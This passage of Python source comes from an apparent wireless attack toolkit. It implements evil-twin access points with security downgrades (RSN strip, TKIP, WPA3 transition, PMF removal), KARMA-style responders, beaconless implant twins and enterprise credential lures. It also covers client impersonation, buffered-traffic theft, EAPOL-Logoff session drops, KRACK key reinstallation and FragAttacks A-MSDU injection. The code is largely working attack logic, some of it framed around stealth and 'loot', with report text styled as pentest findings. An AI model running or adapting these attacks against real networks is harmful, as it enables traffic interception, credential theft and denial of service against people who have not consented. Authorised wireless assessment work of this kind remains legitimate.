    name = "twin_rsn_strip"
    label = "Twin without RSN (secured network cloned open)"
    twin_akm = "psk"
    finding_severity = "high"
    tool = "wifipilot synth.py (beacon builder) + airodump-ng"
    finding_title = "Clients accept an unencrypted twin of a secured network"
    finding_detail = (
        "A beacon with the target's SSID and no RSN element is a change of security "
        "policy announced by a stranger.  Clients that follow the name and ignore the "
        "security configuration land on an open network with the same name and send "
        "their first frames in clear; clients that remember the security configuration "
        "refuse it, and the two behaviours are what the capture separates.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        return [self.twin_beacon(ctx, ap, include_rsn=False),
                self.reference_beacon(ctx, ap)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["assoc_requests"] = [row for row in
                                      management_frames(path, (SUBTYPE_ASSOC_REQ,))]
        return observed

    def discriminator(self) -> str:
        return "drops the RSN element entirely, so the name is the only thing it keeps"


class TwinTkipDowngradeAttack(_Twin):
    """Offer TKIP where the target uses CCMP: the old cipher, accepted by the old client."""

    name = "twin_tkip_downgrade"
    label = "Twin with TKIP (CCMP downgraded, Michael countermeasure)"
    tool = "wifipilot synth.py (RSN builder) + airodump-ng"
    finding_severity = "high"
    finding_title = "A TKIP twin of a CCMP network is accepted"
    finding_detail = (
        "TKIP is a broken cipher kept alive for old clients.  A twin that advertises TKIP "
        "in the pairwise suite list pulls those clients back to a cipher with known "
        "weaknesses, and a client that negotiates it also becomes a candidate for the "
        "Michael countermeasure — one forged MIC frame per TKIP session is enough to "
        "silence it for a minute.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        return [self.twin_beacon(ctx, ap, tkip=True),
                self.reference_beacon(ctx, ap)]

    def discriminate_rsn(self, observed: Dict[str, Any]) -> bool:
        return True

    def discriminator(self) -> str:
        return "advertises TKIP where the target advertises CCMP"


class TwinPmfStripAttack(_Twin):
    """Clone without PMF: clients using 802.11w fall back to unprotected management."""

    name = "twin_pmf_strip"
    label = "Twin with PMF stripped (802.11w downgrade)"
    twin_pmf = False
    tool = "wifipilot synth.py (RSN builder) + airodump-ng"
    finding_severity = "medium"
    finding_title = "Management-frame protection is not required for this name"
    finding_detail = (
        "A client that accepts a beacon without the MFPC/MFPR bits stops protecting its "
        "own management frames — after which a forged deauthentication or disassociation "
        "in this network's name is obeyed.  This is why PMF has to be required on the "
        "access point rather than merely supported: the downgrade is the attack.")

    def discriminator(self) -> str:
        return "clears MFPC and MFPR, which is what turns deauth back on for its clients"


class TwinWpa3TransitionAttack(_Twin):
    """Advertise SAE+PSK on a WPA3-only network: the transition path a WPA2 client takes."""

    name = "twin_wpa3_transition"
    label = "Twin in WPA3 transition mode (WPA2 handshake harvest)"
    twin_akm = "sae+psk"
    tool = "wifipilot synth.py (transition-mode RSN) + airodump-ng"
    finding_title = "The WPA3-only policy can be bypassed through a transition twin"
    finding_detail = (
        "WPA3-only means SAE is the only way in; a twin that also offers WPA2-PSK hands "
        "the client a path with a crackable 4-way handshake, and the capture of that "
        "handshake is the loot.  A client that prefers the stronger AKM when both are "
        "offered is the control case — the capture shows which behaviour each station "
        "chose.")

    def discriminator(self) -> str:
        return "adds the PSK AKM next to SAE, so a WPA2 client has somewhere to land"


class TwinOweTransitionAttack(_Twin):
    """An open twin for an OWE network: no encryption at all, same name."""

    name = "twin_owe_transition"
    label = "Twin against OWE (open clone of an unauthenticated-encryption network)"
    twin_akm = "owe"
    tool = "wifipilot synth.py (OWE RSN) + airodump-ng"
    finding_title = "OWE can be impersonated by a network that does not encrypt"
    finding_detail = (
        "OWE gives an open network encryption without authentication, so the only thing "
        "standing between a client and a plaintext twin is the AKM in the beacon.  A "
        "client that follows the name and skips the AKM check sends its traffic to a "
        "network that never negotiated a key; the capture shows the association and the "
        "first cleartext frames.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        return [self.twin_beacon(ctx, ap, akm="owe"),
                self.reference_beacon(ctx, ap)]

    def discriminator(self) -> str:
        return "reduces the AKM to an association with no key exchange behind it"


class TwinHiddenNameAttack(_Twin):
    """Serve a hidden network's real name, learned from a client's probe request."""

    name = "twin_hidden_name"
    label = "Twin that serves a hidden SSID by its real name"
    tool = "wifipilot synth.py (probe + beacon builders) + airodump-ng"
    finding_title = "The hidden network's name is public knowledge"
    finding_detail = (
        "A hidden SSID is only hidden from the beacon.  Clients probe for the name they "
        "know, so any radio in range can read it out of a probe request and then *serve* "
        "it — which is what this capture shows: the name the client disclosed, and a "
        "beacon carrying it.  Hiding the SSID removes the beacon, not the secret.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        name = (getattr(ap, "hidden_name", "") or ap.essid or "hidden")
        return [build_probe_request(station, name),
                self.twin_beacon(ctx, ap, ssid=name),
                self.reference_beacon(ctx, ap)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["probes"] = management_frames(path, (SUBTYPE_PROBE_REQ,))
        observed["disclosed"] = sorted({(row.get("ssid") or "")
                                        for row in observed["probes"] if row})
        return observed

    def discriminator(self) -> str:
        return "serves the name a client volunteered in a probe request"


class TwinEnterpriseCloneAttack(_Twin):
    """The same name, advertising 802.1X: the supplicant meets our RADIUS."""

    name = "twin_enterprise_clone"
    label = "Twin of an 802.1X network (rogue authenticator, same realm)"
    twin_akm = "802.1x"
    tool = "wifipilot synth.py + a RADIUS identity of our own"
    finding_title = "Enterprise clients follow the name to a rogue authenticator"
    finding_detail = (
        "An enterprise client trusts the *name* it configured, and the server behind it "
        "only by certificate.  A twin that advertises the same SSID with the MGT AKM "
        "becomes the authenticator: the supplicant sends its identity in the clear and "
        "then starts EAP with whatever is behind the beacon.  The capture shows the "
        "identities volunteered before any certificate was ever presented — which is the "
        "line a fast, silent credential harvest needs.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        return [self.twin_beacon(ctx, ap, akm="802.1x"),
                self.reference_beacon(ctx, ap)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["eapol"] = eapol_rows(path)
        return observed

    def discriminator(self) -> str:
        return "claims the enterprise AKM, so supplicants start EAP with our server"


class TwinMobilityDomainAttack(_Twin):
    """Join the target's 802.11r mobility domain, so fast-roaming clients cross over."""

    name = "twin_mobility_domain"
    label = "Twin inside the target's 802.11r mobility domain (fast-roam lure)"
    tool = "wifipilot synth.py (Mobility Domain element)"
    finding_severity = "medium"
    finding_title = "Fast roaming moves clients to our BSSID without re-authentication"
    finding_detail = (
        "A station that roams with 802.11r re-keys against the *mobility domain*, not "
        "against a BSSID it has seen before.  A twin that announces the same domain — a "
        "two-octet value that is visible in every beacon — is a legitimate roaming "
        "target as far as the client is concerned, and the reassociation request carries "
        "the RSN information element the attack reuses.  Fast transition is a "
        "performance feature that quietly broadens who a client will talk to.")

    def twin_elements(self, ap: AccessPoint, ctx: AttackContext) -> bytes:
        return super().twin_elements(ap, ctx) + mobility_domain()

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["reassoc"] = management_frames(path, (SUBTYPE_REASSOC_REQ,))
        return observed

    def discriminator(self) -> str:
        return "announces the target's mobility domain, which is what a roaming client matches on"


class TwinBssLoadAttack(_Twin):
    """Advertise a nearly empty, very fast network: load is a steering signal."""

    name = "twin_bss_load"
    label = "Twin with a forged BSS Load element (steering by admission control)"
    tool = "wifipilot synth.py (BSS Load + WMM elements)"
    finding_severity = "medium"
    finding_title = "BSS Load steers clients without a single deauthentication"
    finding_detail = (
        "The BSS Load element reports how many stations are associated and how busy the "
        "channel is, and roaming clients weigh it.  A twin that claims 33% utilisation "
        "and two stations looks like the quiet half of the same network, so a station "
        "decides to roam there on its own — and nothing an operator can see as an attack "
        "has taken place.")

    def twin_elements(self, ap: AccessPoint, ctx: AttackContext) -> bytes:
        from ..synth import bss_load_element
        return super().twin_elements(ap, ctx) + bss_load_element(2, 33, 2000)

    def discriminator(self) -> str:
        return "claims a quiet network through a forged BSS Load element"


class TwinCountryMismatchAttack(_Twin):
    """Clone the country and channel plan: a client that checks regulation does not blink."""

    name = "twin_country_mismatch"
    label = "Twin with the target's country element on a channel it may not use"
    tool = "wifipilot synth.py (Country element)"
    finding_severity = "low"
    finding_title = "The regulatory element is copyable, and clients trust it"
    finding_detail = (
        "The country element tells a station which channels are legal and with what "
        "power.  Since it is unsigned, a twin can declare one regulatory domain while "
        "transmitting on a channel from another — and a station that respects the element "
        "follows the clone onto a channel its own driver would otherwise refuse.")

    def twin_elements(self, ap: AccessPoint, ctx: AttackContext) -> bytes:
        return super().twin_elements(ap, ctx) + country_element(code="US", first_channel=36,
                                                                channels=4, max_power=30)

    def discriminator(self) -> str:
        return "declares a country and channel plan of its own choosing"


class TwinProbeShadowAttack(_Twin):
    """No beacons at all: answer probes only, so the radio never announces itself."""

    name = "twin_probe_shadow"
    label = "Probe-response shadow twin (no beacons to see in a scan)"
    tool = "wifipilot synth.py (probe response builder)"
    noise = "quiet"
    finding_severity = "high"
    finding_title = "A twin can answer probes without ever broadcasting a beacon"
    finding_detail = (
        "A scan finds networks that beacon; a station finds networks by probing.  A twin "
        "that only answers directed probe requests is invisible to every survey — there "
        "is nothing in the scan results — while the stations that know the name see a "
        "perfectly ordinary network.  This is the shape a long-lived implant takes: no "
        "beacon, no SSID in the survey, and a capture that only shows the clients that "
        "asked for the name first.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        frames: List[bytes] = []
        for station in self.stations(ctx)[:3]:
            frames.append(build_probe_request(station, ap.essid or ""))
            frames.append(self.twin_probe_response(ctx, ap, station))
        frames.append(self.reference_beacon(ctx, ap))
        return frames

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["probes"] = management_frames(path, (SUBTYPE_PROBE_REQ,))
        observed["answers"] = management_frames(path, (SUBTYPE_PROBE_RESP,))
        return observed

    def discriminator(self) -> str:
        return "never beacons: it only answers the probe requests it hears"


class TwinSignalBoostAttack(_Twin):
    """Be the loudest beacon on the channel: closer is better, and clients measure."""

    name = "twin_signal_boost"
    label = "Twin with a signal advantage (steering by RSSI)"
    tool = "wifipilot synth.py + a transmitter near the client"
    finding_severity = "medium"
    finding_title = "Signal level decides, and our twin wins it"
    finding_detail = (
        "Clients pick the strongest BSSID with a matching name.  A hijacker that sits "
        "closer — a pocket access point, a phone in hotspot mode, a transmitter on the "
        "next desk — beats the real AP on the only metric the client uses at that moment, "
        "and the capture quantifies the margin: the twin's beacons at a much higher level "
        "than the target's, on the same channel, with the same name.")

    def twin_signals(self, ctx: AttackContext, ap: AccessPoint) -> Optional[Sequence[int]]:
        return [self.twin_signal, -72]                    # ours loud, the target far

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        signals = observed.get("signals") or {}
        observed["margin"] = (signals.get(_twin_address(ap.bssid), 0)
                              - signals.get(ap_bssid(ap.bssid), 0))
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        report = super().interpret(ctx, ap, observed)
        report["detail"] += (f"; the twin is {observed.get('margin', 0)} dB stronger than "
                             f"the network it is imitating, which is the whole margin a "
                             f"client needs to prefer it")
        return report

    def discriminator(self) -> str:
        return "is the louder of the two by the margin the capture reports"


class TwinSsidSuffixAttack(_Twin):
    """A name that looks identical in a UI but is a different byte string."""

    name = "twin_ssid_suffix"
    label = "Twin with a look-alike SSID (trailing space and homoglyph)"
    tool = "wifipilot synth.py (beacon builder)"
    finding_severity = "medium"
    finding_title = "A look-alike SSID is indistinguishable in a list of networks"
    finding_detail = (
        "SSIDs are byte strings, and a phone's network list renders a trailing space, a "
        "zero-width joiner or a Cyrillic 'e' exactly like the real name.  The twin uses "
        "the target's name with one character added, so the *user* chooses the clone — "
        "the attack does not need to beat the client, only the person reading the list.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        look = (ap.essid or "wifi") + " "
        return [self.twin_beacon(ctx, ap, ssid=look),
                self.reference_beacon(ctx, ap)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        names = sorted({row["ssid"] for row in observed.get("beacons") or []})
        observed["names"] = names
        observed["lookalike"] = [name for name in names
                                 if name.strip() == (ap.essid or "").strip()]
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        report = super().interpret(ctx, ap, observed)
        variants = observed.get("lookalike") or []
        report["detail"] += (f"; the capture holds {len(variants)} name(s) that strip to "
                             f"the target's: {', '.join(repr(name) for name in variants)}")
        return report

    def discriminator(self) -> str:
        return "uses a name that renders identically and compares differently"


class TwinMultiNameAttack(_Twin):
    """One radio, many names: the twin answers every name it hears probed."""

    name = "twin_multi_name"
    label = "Multi-name twin (KARMA-style answers, one beacon list)"
    tool = "wifipilot synth.py + airodump-ng (probe feed)"
    noise = "loud"
    finding_severity = "high"
    finding_title = "One radio can be every network a client is looking for"
    finding_detail = (
        "A station probes for the names it remembers.  A twin that answers each probe with "
        "a beacon-like response for that name becomes every network at once, and the "
        "client picks whichever one it trusts most.  The capture shows the names asked for "
        "and the answers given, one line per name — which is also the fingerprint of a "
        "KARMA/MANA access point, so the same evidence detects it.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        names = [ap.essid or "wifi", "HOME-GUEST", "CorpWiFi", "iPhone-A14",
                 "Vodafone-9C31"]
        frames: List[bytes] = []
        for index, name in enumerate(names):
            station = self.stations(ctx)[index % max(1, len(self.stations(ctx)))]
            frames.append(build_probe_request(station, name))
            frames.append(self.twin_probe_response(ctx, ap, station, ssid=name))
        return frames

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["probes"] = management_frames(path, (SUBTYPE_PROBE_REQ,))
        observed["names"] = sorted({row["ssid"] for row in observed.get("beacons") or []
                                    if row["ssid"]})
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        names = observed.get("names") or []
        return {"title": self.finding_title, "severity": self.finding_severity,
                "body": self.finding_detail,
                "detail": (f"{len(names)} name(s) answered from one radio on channel "
                           f"{ap.channel or 6}: {', '.join(names[:6])}"),
                "extra": {"family": self.family, "names": names,
                          "responses": len(observed.get("beacons") or [])}}

    def discriminator(self) -> str:
        return "answers several names from the same radio, which is the KARMA signature"


class TwinWmmAcmAttack(_Twin):
    """WMM with admission control: a beacon that throttles the clients that obey it."""

    name = "twin_wmm_acm"
    label = "Twin with forged WMM admission control (bandwidth steering)"
    tool = "wifipilot synth.py (WMM parameter element)"
    finding_severity = "medium"
    finding_title = "WMM parameters are unsigned, and clients obey them"
    finding_detail = (
        "The WMM parameter element carries the EDCA parameters and the admission-control "
        "bits.  A twin that requires admission control for voice and video makes a "
        "station ask before it can use those access categories — and the request goes to "
        "the network's own admission controller, which is exactly the queue this attack "
        "declines to grant.  A voice call on a hijacked BSSID degrades without a single "
        "deauthentication frame.")

    twin_wmm = wmm_parameter_element(acm_be=True, aifsn=1, ecw_min=3)

    def discriminator(self) -> str:
        return "sets the ACM bit, so stations have to ask before they may speak"

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        return [self.twin_beacon(ctx, ap), self.reference_beacon(ctx, ap)]


class TwinNeighbourLureAttack(_Twin):
    """Put our twin in a forged neighbour report, so roaming clients are told to go."""

    name = "twin_neighbour_lure"
    label = "Twin named in a forged 802.11k neighbour report"
    tool = "wifipilot synth.py (Neighbor Report element)"
    finding_severity = "high"
    finding_title = "A forged neighbour report sends clients to our twin"
    finding_detail = (
        "802.11k lets an access point *tell* a station which BSSIDs are its neighbours, "
        "with their channels and their preferences.  The report is an element in a "
        "beacon, and nothing signs it: a twin that lists itself as the best neighbour of "
        "the real network has clients measuring — and moving to — the hijacker by the "
        "network's own instruction.")

    def twin_elements(self, ap: AccessPoint, ctx: AttackContext) -> bytes:
        return (super().twin_elements(ap, ctx)
                + neighbour_report_element([(_twin_address(ap.bssid), ap.channel or 6, 3)]))

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["neighbours"] = [row.get("neighbour_report") for row in
                                  observed.get("beacons") or []
                                  if row.get("neighbour_report")]
        return observed

    def discriminator(self) -> str:
        return "lists itself as the target's best neighbour for the network to hand out"


class TwinQuietElementAttack(_Twin):
    """A Quiet element in the beacon: clients in the area stop transmitting."""

    name = "twin_quiet_element"
    label = "Twin with a forged Quiet element (silence on the channel)"
    tool = "wifipilot synth.py (Quiet element)"
    finding_severity = "medium"
    finding_title = "A forged Quiet element silences the channel around our twin"
    finding_detail = (
        "The Quiet element tells stations that the channel will be silent for a period "
        "and that they must not transmit during it.  A client that obeys holds its "
        "traffic — for as long as the twin keeps repeating the element, which is a "
        "denial of service that never looks like one: no deauthentication, no flood, just "
        "a well-behaved station waiting for a quiet period that never ends.")

    def twin_elements(self, ap: AccessPoint, ctx: AttackContext) -> bytes:
        from ..synth import ie
        return super().twin_elements(ap, ctx) + ie(40, bytes([1, 200, 60, 0, 5, 0]))

    def discriminator(self) -> str:
        return "declares a quiet period, so stations stop transmitting on their own"


# --------------------------------------------------------------------------- #
# family two: client impersonation
#
# These attacks wear a *station's* address.  The AP has seen that address before, so
# the frames are not strangers — they are the client, as far as the AP can tell.
# --------------------------------------------------------------------------- #

class _ClientHijack(_Hijack):
    """Frames in a station's name, with the station's own address and sequence."""

    family = "client"
    category = "rogue"
    noise = "quiet"
    impact = "degraded"
    finding_severity = "high"
    #: how many of the target's stations the attack uses
    station_count = 1

    def clients(self, ctx: AttackContext) -> List[str]:
        return self.stations(ctx)[:max(1, self.station_count)]

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        return [build_auth_request(ap.bssid, self.clients(ctx)[0])]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["transmitters"] = sorted((observed.get("census") or {})
                                          .get("transmitters", {}))
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        stations = self.clients(ctx)
        return {"title": self.finding_title, "severity": self.finding_severity,
                "body": self.finding_detail,
                "detail": (f"{len(stations)} station address(es) of {ap.display_name} "
                           f"were used to transmit on channel {ap.channel or 6}: "
                           f"{', '.join(stations)} — the AP has seen every one of them "
                           f"before, and an AP that keys its decisions on the address "
                           f"treats the sender as that client"),
                "extra": {"family": self.family, "stations": stations}}


class ClientAssocForgeryAttack(_ClientHijack):
    """Associate as a client the AP already knows, without its credentials."""

    name = "client_assoc_forgery"
    label = "Client impersonation: association as an existing station"
    tool = "wifipilot rawtx.py (authentication + association)"
    finding_title = "A station's identity is an address, and addresses are not secrets"
    finding_detail = (
        "The association exchange proves nothing about who is sending it on an open or "
        "WEP network, and on a PSK network it is the 4-way handshake that decides.  Either "
        "way the AP's association table, its per-station counters and its firewall rules "
        "are keyed on the address in the frame: an attacker who sends a station's address "
        "is that station as far as the infrastructure is concerned.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.clients(ctx)[0]
        return [build_auth_request(ap.bssid, station),
                build_ssid_confusion_beacon(ap.bssid, ap.essid or "wifi",
                                            ap.channel or 6),
                build_qos_data_frame(ap.bssid, station, payload=b"\x08\x00")]


class ClientTableFloodAttack(_ClientHijack):
    """Associate under the names of every client the scan has seen."""

    name = "client_table_flood"
    label = "Client-table flood with the network's own station addresses"
    tool = "wifipilot rawtx.py"
    station_count = 8
    noise = "loud"
    finding_severity = "medium"
    finding_title = "The association table is filled with the site's own addresses"
    finding_detail = (
        "A flood is easy to notice; a flood that uses the addresses the site already "
        "expects is not.  Every authentication is a real client's address, so a "
        "monitoring tool that counts *new* stations counts nothing at all, while the AP's "
        "table fills and its oldest entries — the real clients' — are evicted.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        frames: List[bytes] = []
        for station in self.clients(ctx):
            frames.append(build_auth_request(ap.bssid, station))
            frames.append(build_assoc_response(ap.bssid, station))
        return frames


class ClientSleepSpoofAttack(_ClientHijack):
    """Put somebody else's link to sleep with a null data frame carrying the PM bit."""

    name = "client_sleep_spoof"
    label = "Power-save spoof (null data in a client's name buffers its traffic)"
    tool = "wifipilot rawtx.py (QoS null data)"
    finding_title = "A client can be put to sleep by whoever knows its address"
    finding_detail = (
        "The Power Management bit in a null data frame tells the AP that the station is "
        "entering power save, after which the AP buffers everything addressed to it.  "
        "The bit is not authenticated, so a forged frame in a client's name stops that "
        "client's traffic being delivered — a silent, continuous denial of service that "
        "looks, from the AP's side, exactly like a station that went to sleep.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.clients(ctx)[0]
        return [build_null_data(ap.bssid, station, qos=True, power_save=True),
                build_qos_data_frame(ap.bssid, station, power_save=True)]


class ClientPsPollTheftAttack(_ClientHijack):
    """Ask for the frames the AP buffered for somebody else (PS-Poll with their AID)."""

    name = "client_ps_poll_theft"
    label = "PS-Poll frame theft (collect a client's buffered traffic)"
    tool = "wifipilot rawtx.py (PS-Poll)"
    finding_title = "Buffered frames are handed to whoever asks for the AID"
    finding_detail = (
        "While a station sleeps the AP holds its frames.  It releases them to a PS-Poll "
        "naming the association id, and the association id is a small integer that "
        "appears in every frame the station sends.  A forged PS-Poll in the station's "
        "address collects the buffered traffic — which is a capture of somebody else's "
        "frames without ever touching the AP's table.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.clients(ctx)[0]
        claim = build_qos_data_frame(ap.bssid, station, payload=b"\x04\x00")
        return [build_null_data(ap.bssid, station, power_save=True), claim]


class ClientTdlsTeardownAttack(_ClientHijack):
    """Tear down a direct link between two other stations (TDLS teardown)."""

    name = "client_tdls_teardown"
    label = "TDLS teardown between two other stations"
    tool = "wifipilot rawtx.py (TDLS action)"
    station_count = 2
    finding_title = "Direct links between stations can be torn down by a third party"
    finding_detail = (
        "TDLS lets two stations talk directly, and the teardown frame is a plain action "
        "frame addressed from one of them.  A third party that sends the teardown in one "
        "station's name breaks the direct link, and the traffic falls back through the AP "
        "— where the attacker is listening.  The switch from direct to relayed is the "
        "observation that turns a teardown into a capture opportunity.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        clients = self.clients(ctx)
        peer = clients[1] if len(clients) > 1 else clients[0]
        return [build_tdls_teardown(ap.bssid, clients[0], peer=peer, reason=3),
                build_action(ap.bssid, clients[0], category=12, action=0,
                             payload=bytes([1, 2, 3, 4]))]


class ClientSaQueryBypassAttack(_ClientHijack):
    """Hold the SA Query open: PMF protects management frames only if the client answers."""

    name = "client_sa_query_bypass"
    label = "SA Query hold (PMF teardown raced by a non-answer)"
    tool = "wifipilot rawtx.py (SA Query)"
    finding_title = "PMF's protection ends when a client does not answer"
    finding_detail = (
        "With 802.11w the client answers a protected SA Query before it acts on a "
        "deauthentication, which is what closes the disconnect race.  A station that "
        "does not answer — asleep, out of range for a moment, or stuck in a driver that "
        "drops the query — times the exchange out, and the deauthentication that follows "
        "is obeyed.  The capture shows the query, the silence, and the teardown.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.clients(ctx)[0]
        return [build_sa_query(ap.bssid, station, token=1, response=False, protected=True),
                build_disassoc(ap.bssid, station, reason=7)]


class ClientRoamHijackAttack(_ClientHijack):
    """A reassociation with a forged 802.11r RIC: the roam a client never started."""

    name = "client_roam_hijack"
    label = "Roam hijack (forged 802.11r reassociation in a client's name)"
    tool = "wifipilot rawtx.py (reassociation request)"
    finding_title = "A forged reassociation moves a client's session to our BSSID"
    finding_detail = (
        "Reassociation is how a station follows its network between access points, and "
        "the request is a management frame in the station's name.  Sent to the target AP "
        "it looks like a client that has just wandered off to another BSSID and come "
        "back; sent *at* the client's own network it can leave the AP believing the "
        "session moved.  The capture records the reassociation and the address it "
        "carried, which is the evidence that the roaming decision was not the client's.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.clients(ctx)[0]
        return [build_reassoc_request(ap.bssid, station, current_bssid=ap.bssid,
                                      ssid=ap.essid or ""),
                build_auth_request(ap.bssid, station)]


class ClientEapolLogoffAttack(_ClientHijack):
    """Log a client off with one unauthenticated frame (EAPOL-Logoff)."""

    name = "client_eapol_logoff"
    label = "EAPOL-Logoff in a client's name (session drop with one frame)"
    requires = ()
    tool = "wifipilot synth.py (EAPOL-Logoff)"
    noise = "quiet"
    finding_title = "One unauthenticated frame ends an authenticated session"
    finding_detail = (
        "EAPOL-Logoff is a single frame with no protection, and every AP in the "
        "deployment obeys it: the station's session ends and its keys are removed.  The "
        "client reconnects — that is the capture opportunity — but the frame itself is "
        "also the finding: a session that can be ended by a stranger is a session whose "
        "availability is not controlled by the site.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        frames: List[bytes] = []
        for station in self.clients(ctx):
            frames.append(build_eapol_logoff(ap.bssid, station))
        frames.append(build_eapol_start(ap.bssid, self.clients(ctx)[0]))
        return frames

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["eapol"] = eapol_rows(path)
        return observed


class ClientFourWayRaceAttack(_ClientHijack):
    """Replay message 3 into the exchange and reinstall the key (KRACK, CVE-2017-13077)."""

    name = "client_fourway_race"
    label = "4-way handshake replay (KRACK key reinstallation)"
    tool = "wifipilot synth.py (EAPOL builders) + hashcat 22000 for the MIC"
    finding_title = "A replayed message 3 reinstalls the pairwise key"
    finding_detail = (
        "Message 3 of the 4-way handshake carries the nonce and the sequence number the "
        "client uses to install its key.  Replaying it makes a vulnerable supplicant "
        "install the *same* key again and reset its transmit counters, which reuses "
        "keystream — and a reused keystream is decrypted by XOR, not by cryptanalysis.  "
        "The capture is the evidence: the same replay counter arriving twice in one "
        "exchange, which is also exactly what a WIDS should alert on.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.clients(ctx)[0]
        nonce = bytes(range(32))
        message_three = self.eapol_frame(ap, station, nonce, key_info=0x13CA, replay=3)
        return [message_three, build_eapol_logoff(ap.bssid, station), message_three]

    @staticmethod
    def eapol_frame(ap: AccessPoint, station: str, nonce: bytes, key_info: int,
                    replay: int) -> bytes:
        from ..rawtx import build_data
        eapol = _eapol_key(key_info, replay, nonce[:32])
        return build_data(ap.bssid, station, eapol, ethertype=0x888E)

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        rows = eapol_rows(path)
        counters = [row["replay"] for row in rows]
        observed["eapol"] = rows
        observed["replayed"] = len(counters) != len(set(counters))
        observed["counters"] = counters
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        report = super().interpret(ctx, ap, observed)
        counters = observed.get("counters") or []
        report["detail"] = (
            f"the same EAPOL-Key replay counter arrived {len(counters)} time(s) in one "
            f"exchange ({counters}); a supplicant that installs the key on the second "
            f"arrival resets its packet numbers and reuses the keystream, and the capture "
            f"holds the duplicate that proves the replay")
        return report


class ClientAmsduInjectAttack(_ClientHijack):
    """FragAttacks: a plaintext frame carrying the A-MSDU present bit into a client."""

    name = "client_amsdu_inject"
    label = "A-MSDU injection into a client's connection (FragAttacks)"
    tool = "wifipilot synth.py (QoS data with A-MSDU present)"
    finding_title = "A plaintext frame is accepted into an encrypted connection"
    finding_detail = (
        "The A-MSDU present bit says the frame's payload is a list of subframes with "
        "their own headers — which are not covered by the CCMP MIC.  A receiver that "
        "accepts a *plaintext* frame with that bit set parses the subframes and passes "
        "them up the stack, so an attacker injects a packet into an encrypted connection "
        "without knowing the key.  The fix is in the client, which is why the finding "
        "names the clients that must be updated rather than the network.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.clients(ctx)[0]
        # destination, source, length, then an ARP subframe: the shape the parser reads
        subframe_header = (bytes.fromhex(station.replace(":", ""))
                           + bytes.fromhex(ap.bssid.replace(":", ""))
                           + struct.pack(">H", 0x001C))
        return [build_qos_data_frame(ap.bssid, station,
                                     payload=subframe_header + bytes(24)),
                build_arp_reply(station, "192.168.1.1", ap.bssid, "192.168.1.20",
                                bssid=ap.bssid)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["arp"] = arp_rows(path)
        observed["data"] = [{key: row[key] for key in ("src", "destination", "ethertype")}
                            for row in data_rows(path)]
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        report = super().interpret(ctx, ap, observed)
        report["detail"] = (
            f"an unencrypted QoS data frame carrying the A-MSDU present bit and an ARP "
            f"subframe inside it left the radio addressed to {self.clients(ctx)[0]}; "
            f"a client that parses the subframe hands the packet to its stack — the "
